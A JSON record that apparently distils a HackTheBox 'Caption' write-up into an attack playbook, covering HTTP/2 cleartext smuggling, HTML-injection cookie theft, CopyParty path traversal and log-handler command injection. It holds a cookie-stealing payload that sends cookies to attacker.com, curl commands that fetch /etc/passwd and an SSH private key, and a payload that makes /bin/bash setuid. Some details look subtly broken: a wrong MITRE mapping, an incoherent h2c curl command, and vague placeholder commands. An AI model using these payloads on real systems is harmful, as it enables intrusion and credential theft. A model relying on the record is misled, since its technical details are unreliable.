{
  "writeup_id": "Htb_Caption",
  "scenario_fingerprint": {
    "scenario_name": "linux_web_h2c_smuggling_copyparty",
    "primary_services": [
      "ssh",
      "http",
      "http-proxy"
    ],
    "port_signature": "22+80+8080",
    "service_combination": "ssh+http+gitbucket",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "http2_cleartext_smuggling",
    "privilege_path": "web_injection_to_ssh_key_to_command_injection",
    "attack_complexity": "hard",
    "estimated_time": "3-4 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "h2c_smuggling_capability",
      "caching_server_bypass",
      "copyparty_directory_traversal",
      "html_injection_cookie_theft"
    ],
    "environmental_clues": [
      "gitbucket_on_8080",
      "web_application_firewall",
      "caching_proxy_layer",
      "ubuntu_openssh_8.9p1"
    ],
    "similar_scenarios": [
      "web_cache_poisoning",
      "http_smuggling_attacks"
    ],
    "unique_aspects": [
      "http2_cleartext_protocol_abuse",
      "copyparty_file_server_exploitation",
      "log_handler_command_injection"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "HTTP/2_cleartext_smuggling",
        "success_reason": "Caching server and proxy/WAF allowed h2c protocol upgrade smuggling",
        "prerequisite_indicators": [
          "multiple_http_services_detected",
          "proxy_or_waf_present",
          "http2_upgrade_supported",
          "caching_layer_identified"
        ],
        "recognition_patterns": [
          "redirect to domain name (caption.htb)",
          "different response patterns on ports 80/8080",
          "proxy-like 400 bad request responses",
          "cache-control headers present"
        ],
        "failure_modes": [
          "no_http2_support",
          "proper_proxy_configuration",
          "unified_backend_handling",
          "strict_protocol_validation"
        ],
        "environmental_factors": [
          "misconfigured_reverse_proxy",
          "legacy_caching_implementation",
          "insufficient_protocol_validation",
          "multiple_backend_services"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "30-60 minutes"
      },
      {
        "technique": "HTML_injection_cookie_theft",
        "success_reason": "Admin interface accessible via smuggling with insufficient input validation",
        "prerequisite_indicators": [
          "admin_interface_discovered",
          "input_fields_present",
          "cookie_based_authentication",
          "xss_vectors_available"
        ],
        "recognition_patterns": [
          "admin login pages",
          "reflected user input",
          "session cookies in responses",
          "privileged functionality visible"
        ],
        "failure_modes": [
          "proper_input_sanitization",
          "csp_headers_present",
          "httponly_secure_cookies",
          "admin_interface_properly_protected"
        ],
        "environmental_factors": [
          "weak_input_validation",
          "missing_security_headers",
          "accessible_admin_interfaces",
          "cookie_based_sessions"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "directory_traversal_copyparty",
        "success_reason": "CopyParty instance vulnerable to path traversal for SSH key access",
        "prerequisite_indicators": [
          "copyparty_service_identified",
          "file_upload_download_functionality",
          "insufficient_path_validation",
          "ssh_keys_on_filesystem"
        ],
        "recognition_patterns": [
          "CopyParty web interface",
          "file management functionality",
          "version information disclosure",
          "directory listing capabilities"
        ],
        "failure_modes": [
          "proper_path_sanitization",
          "chroot_jail_implementation",
          "updated_copyparty_version",
          "restricted_file_access"
        ],
        "environmental_factors": [
          "outdated_copyparty_version",
          "insufficient_access_controls",
          "ssh_keys_in_accessible_paths",
          "weak_file_permissions"
        ],
        "success_probability": 0.8,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "command_injection_log_handler",
        "success_reason": "Log handler processes user input without proper sanitization",
        "prerequisite_indicators": [
          "log_processing_functionality",
          "user_controlled_log_input",
          "insufficient_input_validation",
          "system_command_execution"
        ],
        "recognition_patterns": [
          "log viewing interfaces",
          "log file manipulation",
          "system command patterns in logs",
          "error messages revealing internals"
        ],
        "failure_modes": [
          "proper_input_sanitization",
          "parameterized_commands",
          "restricted_execution_context",
          "log_input_validation"
        ],
        "environmental_factors": [
          "custom_log_processing_scripts",
          "insufficient_privilege_separation",
          "weak_input_validation",
          "system_command_usage"
        ],
        "success_probability": 0.7,
        "typical_timeframe": "20-40 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "HTTP/2 cleartext smuggling capability",
        "discovery_method": "Protocol analysis and proxy behavior testing",
        "why_critical": "Bypassed WAF/proxy restrictions to access hidden admin interfaces",
        "how_to_recognize": [
          "multiple HTTP services on different ports",
          "proxy/caching layer responses",
          "HTTP/2 upgrade support",
          "inconsistent response patterns"
        ],
        "follow_up_actions": [
          "test_h2c_protocol_upgrade",
          "enumerate_hidden_endpoints",
          "identify_admin_interfaces",
          "test_request_smuggling"
        ]
      },
      {
        "discovery": "CopyParty file management service",
        "discovery_method": "Service enumeration via smuggled requests",
        "why_critical": "Directory traversal vulnerability provided SSH key access",
        "how_to_recognize": [
          "CopyParty web interface",
          "file upload/download functionality",
          "version disclosure",
          "directory browsing capabilities"
        ],
        "follow_up_actions": [
          "test_directory_traversal",
          "enumerate_accessible_files",
          "search_for_ssh_keys",
          "test_file_upload_restrictions"
        ]
      },
      {
        "discovery": "SSH private key via directory traversal",
        "discovery_method": "Path traversal in CopyParty service",
        "why_critical": "Direct system access as legitimate user",
        "how_to_recognize": [
          "SSH key file patterns",
          "user home directories accessible",
          "weak file permissions",
          "predictable key locations"
        ],
        "follow_up_actions": [
          "extract_ssh_private_key",
          "identify_target_username",
          "test_ssh_authentication",
          "enumerate_user_privileges"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "user_ssh_access",
        "escalation_method": "command_injection_log_handler",
        "why_possible": "Log processing system executed user-controlled input without sanitization",
        "recognition_signs": [
          "log_management_functionality",
          "user_input_in_logs",
          "system_command_execution",
          "insufficient_input_validation"
        ],
        "exploitation_path": "SSH Access → Log Input Manipulation → Command Injection → Root Shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80,8080 open with HTTP redirect to caption.htb and GitBucket",
        "decision": "Enumerate web applications and check for HTTP smuggling opportunities",
        "reasoning": "Multiple HTTP services suggest proxy/caching infrastructure vulnerable to smuggling",
        "confidence": 0.85,
        "alternatives": [
          {
            "option": "gitbucket_enumeration",
            "when": "if smuggling fails"
          },
          {
            "option": "subdomain_enumeration",
            "when": "if direct access blocked"
          }
        ],
        "success_indicators": [
          "proxy_cache_headers_detected",
          "different_responses_between_ports",
          "waf_blocking_detected"
        ],
        "next_decision": "test_http2_cleartext_smuggling"
      },
      {
        "step": 2,
        "situation": "Confirmed caching server and WAF blocking direct access",
        "decision": "Exploit HTTP/2 cleartext (h2c) smuggling to bypass restrictions",
        "reasoning": "h2c smuggling can bypass WAF and access blocked endpoints",
        "confidence": 0.9,
        "prerequisites": [
          "proxy_infrastructure_confirmed",
          "blocked_endpoints_identified"
        ],
        "success_indicators": [
          "bypassed_waf_restrictions",
          "accessed_blocked_pages"
        ],
        "failure_fallbacks": [
          "request_smuggling",
          "cache_poisoning",
          "gitbucket_exploitation"
        ]
      },
      {
        "step": 3,
        "situation": "Successfully bypassed WAF via h2c smuggling",
        "decision": "Look for HTML injection points to steal admin cookies",
        "reasoning": "Admin access needed for further exploitation of backend services",
        "confidence": 0.8,
        "prerequisites": [
          "smuggling_working",
          "admin_pages_accessible"
        ],
        "success_indicators": [
          "html_injection_successful",
          "admin_cookie_captured"
        ],
        "failure_fallbacks": [
          "direct_backend_exploitation",
          "gitbucket_attacks"
        ]
      },
      {
        "step": 4,
        "situation": "Obtained admin cookie via HTML injection",
        "decision": "Enumerate backend services accessible with admin privileges",
        "reasoning": "Admin access likely reveals additional services like CopyParty",
        "confidence": 0.85,
        "prerequisites": [
          "admin_cookie_obtained"
        ],
        "success_indicators": [
          "copyparty_instance_found",
          "file_management_access"
        ],
        "failure_fallbacks": [
          "privilege_escalation_via_webapp"
        ]
      },
      {
        "step": 5,
        "situation": "Found CopyParty instance with admin access",
        "decision": "Exploit directory traversal vulnerability to read SSH keys",
        "reasoning": "CopyParty known for path traversal issues, SSH keys common target",
        "confidence": 0.9,
        "prerequisites": [
          "copyparty_access",
          "admin_privileges"
        ],
        "success_indicators": [
          "ssh_key_retrieved",
          "user_credentials_found"
        ],
        "failure_fallbacks": [
          "config_file_extraction",
          "log_file_analysis"
        ]
      }
    ],
    "branching_logic": {
      "if_h2c_smuggling_succeeds": {
        "action": "enumerate_blocked_endpoints",
        "tools": [
          "burp_suite",
          "custom_h2c_scripts"
        ],
        "next_phase": "html_injection_testing"
      },
      "if_html_injection_succeeds": {
        "action": "capture_admin_session",
        "tools": [
          "webhook_listener",
          "cookie_stealer"
        ],
        "next_phase": "backend_service_enumeration"
      },
      "if_ssh_key_obtained": {
        "action": "authenticate_and_enumerate_system",
        "tools": [
          "ssh",
          "linpeas",
          "pspy"
        ],
        "next_phase": "privilege_escalation_enumeration"
      },
      "if_copyparty_fails": {
        "action": "exploit_gitbucket_vulnerabilities",
        "alternatives": [
          "rce_via_git_hooks",
          "credential_extraction"
        ],
        "decision_criteria": "based_on_gitbucket_version"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_h2c_smuggling_on_multi_http_ports",
        "reasoning": "high_success_rate_against_proxy_infrastructure",
        "applicability": "multiple_http_services_detected"
      },
      {
        "rule": "prioritize_admin_cookie_theft_over_direct_exploitation",
        "reasoning": "admin_access_unlocks_backend_services",
        "applicability": "html_injection_possible"
      },
      {
        "rule": "check_copyparty_directory_traversal_immediately",
        "reasoning": "known_vulnerability_with_high_impact",
        "applicability": "copyparty_instance_found"
      },
      {
        "rule": "enumerate_log_handlers_for_command_injection",
        "reasoning": "common_privilege_escalation_vector",
        "applicability": "user_shell_access_obtained"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "HTTP/2 Cleartext Smuggling",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "http-proxy"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "http2_cleartext_support",
          "proxy_or_cache_server_present",
          "differential_http_parsing"
        ],
        "success_indicators": [
          "h2c_upgrade_accepted",
          "smuggled_requests_processed",
          "bypass_waf_or_proxy_restrictions"
        ],
        "incompatible_with": [
          "http2_disabled",
          "strict_http_parsing",
          "single_server_architecture"
        ],
        "confidence_boosters": [
          "haproxy_detected",
          "nginx_proxy_detected",
          "cache_server_headers"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "30-60 minutes"
      },
      {
        "technique": "HTML Injection Cookie Theft",
        "mitre_id": "T1539",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "user_input_reflection",
          "insufficient_output_encoding",
          "admin_session_cookies_present"
        ],
        "success_indicators": [
          "html_tags_rendered",
          "javascript_execution",
          "cookie_exfiltration_successful"
        ],
        "incompatible_with": [
          "strict_csp_policy",
          "html_encoding_enabled",
          "httponly_cookies_only"
        ],
        "confidence_boosters": [
          "user_generated_content",
          "admin_panel_detected",
          "weak_input_validation"
        ],
        "typical_success_rate": 0.72,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "Directory Traversal",
        "mitre_id": "T1083",
        "required_services": [
          "http",
          "https",
          "ftp"
        ],
        "required_ports": [
          80,
          443,
          21,
          8080
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "file_serving_application",
          "insufficient_path_validation",
          "readable_system_files"
        ],
        "success_indicators": [
          "etc_passwd_readable",
          "ssh_keys_accessible",
          "config_files_exposed"
        ],
        "incompatible_with": [
          "chroot_jail",
          "strict_path_validation",
          "minimal_file_permissions"
        ],
        "confidence_boosters": [
          "copyparty_detected",
          "file_manager_application",
          "default_configurations"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "Command Injection in Log Handler",
        "mitre_id": "T1059",
        "required_services": [
          "http",
          "ssh"
        ],
        "required_ports": [
          22,
          80,
          443,
          8080
        ],
        "os_requirements": [
          "linux",
          "unix"
        ],
        "environmental_prerequisites": [
          "log_processing_system",
          "user_controlled_log_input",
          "shell_command_execution"
        ],
        "success_indicators": [
          "command_output_in_logs",
          "reverse_shell_connection",
          "privilege_escalation_successful"
        ],
        "incompatible_with": [
          "input_sanitization",
          "restricted_shell_environment",
          "log_isolation"
        ],
        "confidence_boosters": [
          "custom_log_handlers",
          "root_log_processing",
          "weak_input_filtering"
        ],
        "typical_success_rate": 0.83,
        "estimated_time": "20-40 minutes"
      }
    ],
    "environmental_detectors": {
      "web_application_with_proxy": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "http-proxy",
          "https"
        ],
        "banner_indicators": [
          "haproxy",
          "nginx",
          "cache",
          "proxy"
        ],
        "confidence_threshold": 0.8
      },
      "gitbucket_application": {
        "port_indicators": [
          8080
        ],
        "service_indicators": [
          "http-proxy"
        ],
        "banner_indicators": [
          "GitBucket",
          "JSESSIONID"
        ],
        "confidence_threshold": 0.95
      },
      "copyparty_file_server": {
        "port_indicators": [
          80,
          443,
          8080
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "copyparty",
          "file server"
        ],
        "confidence_threshold": 0.9
      },
      "ubuntu_linux": {
        "port_indicators": [
          22
        ],
        "service_indicators": [
          "ssh"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Ubuntu"
        ],
        "confidence_threshold": 0.85
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "http2_cleartext_smuggling",
          "when": "proxy_and_web_server_detected",
          "reason": "bypasses_security_controls_high_impact"
        },
        {
          "attack": "directory_traversal",
          "when": "file_serving_application_detected",
          "reason": "often_leads_to_credential_disclosure"
        }
      ],
      "medium_priority": [
        {
          "attack": "html_injection",
          "when": "user_input_reflection_detected",
          "reason": "enables_session_hijacking"
        },
        {
          "attack": "command_injection_log_handler",
          "when": "log_processing_system_detected",
          "reason": "potential_privilege_escalation"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "HTTP/2 Cleartext Smuggling",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl --http2-prior-knowledge -H 'Connection: Upgrade, HTTP2-Settings' -H 'Upgrade: h2c' -H 'HTTP2-Settings: {base64_settings}' {target_url}",
            "actual_command": "curl --http2-prior-knowledge -H 'Connection: Upgrade, HTTP2-Settings' -H 'Upgrade: h2c' http://caption.htb/admin",
            "output_pattern": "bypassed_waf_response",
            "effectiveness_rating": 4,
            "reliability": 0.75
          }
        ],
        "prerequisites": [
          "varnish_cache_server_present",
          "http2_support_enabled",
          "waf_proxy_misconfiguration"
        ],
        "success_indicators": [
          "access_to_blocked_endpoints",
          "cache_server_headers_present",
          "different_response_from_direct_access"
        ],
        "common_failures": [
          "http2_not_supported",
          "proper_waf_configuration",
          "cache_server_blocks_h2c"
        ],
        "follow_up_techniques": [
          "html_injection",
          "cookie_theft",
          "admin_panel_enumeration"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "HTML Injection for Cookie Theft",
        "mitre_id": "T1055",
        "category": "credential_access",
        "phase": "credential_access",
        "tools_used": [
          {
            "name": "burp_collaborator",
            "command_template": "POST /admin/feedback with payload: <img src='http://{collaborator_url}/?cookie='+document.cookie>",
            "actual_command": "POST with HTML payload to steal admin session",
            "output_pattern": "admin_session_cookie_received",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "html_injection_point_identified",
          "admin_user_interaction",
          "external_callback_mechanism"
        ],
        "success_indicators": [
          "admin_cookie_captured",
          "elevated_access_achieved",
          "admin_panel_accessible"
        ],
        "common_failures": [
          "csp_blocks_external_requests",
          "admin_not_viewing_content",
          "cookie_httponly_flag_set"
        ],
        "follow_up_techniques": [
          "session_hijacking",
          "admin_functionality_abuse",
          "further_enumeration"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "CopyParty Directory Traversal",
        "mitre_id": "T1083",
        "category": "discovery",
        "phase": "lateral_movement",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl '{copyparty_url}/../../../{target_file}'",
            "actual_command": "curl 'http://caption.htb:8080/copyparty/../../../home/user/.ssh/id_rsa'",
            "output_pattern": "-----BEGIN OPENSSH PRIVATE KEY-----",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "wget",
            "command_template": "wget '{copyparty_url}/../../../{target_file}' -O {output_file}",
            "actual_command": "wget 'http://caption.htb:8080/copyparty/../../../etc/passwd' -O passwd",
            "success_factors": [
              "directory_traversal_not_filtered",
              "target_files_readable"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "copyparty_instance_accessible",
          "directory_traversal_vulnerability_present",
          "target_files_exist_and_readable"
        ],
        "success_indicators": [
          "sensitive_files_retrieved",
          "ssh_keys_obtained",
          "system_information_gathered"
        ],
        "common_failures": [
          "path_traversal_filtered",
          "insufficient_file_permissions",
          "copyparty_version_patched"
        ],
        "follow_up_techniques": [
          "ssh_key_authentication",
          "privilege_escalation",
          "system_enumeration"
        ],
        "time_investment": "5-20 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "Log Handler Command Injection",
        "mitre_id": "T1059.004",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "custom_payload",
            "command_template": "trigger_log_entry_with_payload: ';{command};'",
            "actual_command": "';/bin/bash -c \"chmod +s /bin/bash\";'",
            "output_pattern": "command_executed_as_root",
            "effectiveness_rating": 5,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "log_handler_with_command_injection",
          "ability_to_trigger_log_entries",
          "insufficient_input_sanitization"
        ],
        "success_indicators": [
          "root_command_execution",
          "privilege_escalation_achieved",
          "system_compromise_complete"
        ],
        "common_failures": [
          "input_properly_sanitized",
          "log_handler_not_running_as_root",
          "command_injection_filtered"
        ],
        "follow_up_techniques": [
          "persistence_establishment",
          "system_enumeration_as_root",
          "data_exfiltration"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Varnish Cache",
        "use_case": "http2_smuggling_target",
        "effectiveness_rating": 4,
        "reliability": 0.8,
        "learning_curve": "medium",
        "essential_for": [
          "cache_poisoning_attacks",
          "request_smuggling"
        ],
        "alternatives": [
          "nginx_proxy",
          "apache_proxy"
        ],
        "best_practices": [
          "identify_cache_headers_in_responses",
          "test_http2_prior_knowledge_support",
          "analyze_via_headers_for_version_info"
        ]
      },
      {
        "tool": "CopyParty",
        "use_case": "file_sharing_with_directory_traversal",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "file_system_access",
          "sensitive_data_retrieval"
        ],
        "alternatives": [
          "manual_directory_enumeration",
          "other_file_managers"
        ],
        "best_practices": [
          "test_path_traversal_immediately_upon_discovery",
          "target_common_sensitive_files_first",
          "check_for_ssh_keys_and_configuration_files"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "h2c_smuggling_to_admin_access",
        "steps": [
          {
            "step": 1,
            "command": "curl --http2-prior-knowledge -H 'Connection: Upgrade, HTTP2-Settings' -H 'Upgrade: h2c' http://caption.htb/admin",
            "purpose": "Bypass WAF using HTTP/2 cleartext smuggling",
            "expected_output": "Admin panel access bypassing restrictions"
          },
          {
            "step": 2,
            "command": "POST /admin/feedback with HTML payload: <img src='http://attacker.com/?c='+document.cookie>",
            "purpose": "Inject HTML to steal admin cookies",
            "expected_output": "Admin session cookie captured"
          },
          {
            "step": 3,
            "command": "curl -H 'Cookie: admin_session_cookie' http://caption.htb/admin/restricted",
            "purpose": "Access admin functionality with stolen cookie",
            "expected_output": "Full admin panel access"
          }
        ],
        "success_rate": 0.75,
        "typical_duration": "20-60 minutes"
      },
      {
        "sequence_name": "copyparty_traversal_to_ssh_access",
        "steps": [
          {
            "step": 1,
            "command": "curl 'http://caption.htb:8080/copyparty/../../../etc/passwd'",
            "purpose": "Test directory traversal vulnerability",
            "expected_output": "System passwd file contents"
          },
          {
            "step": 2,
            "command": "curl 'http://caption.htb:8080/copyparty/../../../home/user/.ssh/id_rsa' -o id_rsa",
            "purpose": "Extract SSH private key",
            "expected_output": "SSH private key file"
          },
          {
            "step": 3,
            "command": "chmod 600 id_rsa && ssh -i id_rsa user@caption.htb",
            "purpose": "Authenticate using extracted SSH key",
            "expected_output": "SSH shell access as user"
          }
        ],
        "success_rate": 0.9,
        "typical_duration": "10-25 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Caption",
      "difficulty": "Hard",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2024-09-14",
      "author": "MrR3boot",
      "estimated_time": "4-6 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "http2_smuggling",
        "html_injection",
        "directory_traversal"
      ],
      "key_vulnerabilities": [
        "h2c_smuggling",
        "copyparty_directory_traversal",
        "command_injection"
      ],
      "environment_type": "web_application_with_proxy",
      "real_world_relevance": "very_high",
      "learning_value": [
        "http2_protocol_abuse",
        "proxy_bypass_techniques",
        "web_application_firewall_evasion"
      ],
      "prerequisite_knowledge": [
        "http2_protocol",
        "web_proxies",
        "caching_mechanisms",
        "cookie_hijacking"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "protocol_smuggling",
        "proxy_bypass",
        "privilege_escalation"
      ],
      "attack_types": [
        "request_smuggling",
        "session_hijacking",
        "command_injection"
      ],
      "defensive_lessons": [
        "proper_http2_configuration",
        "waf_bypass_prevention",
        "input_validation"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Sneaky",
        "Poison",
        "Arkham"
      ],
      "similarity_reasons": [
        "advanced_web_techniques",
        "proxy_manipulation",
        "protocol_abuse"
      ],
      "unique_aspects": [
        "h2c_smuggling",
        "copyparty_exploitation",
        "caching_server_bypass"
      ],
      "difficulty_factors": [
        "complex_attack_chain",
        "protocol_level_understanding",
        "multiple_bypass_techniques"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T12:42:33.184837",
    "original_file": "0xdf_writeups/Htb Caption.md",
    "content_length": 93593,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}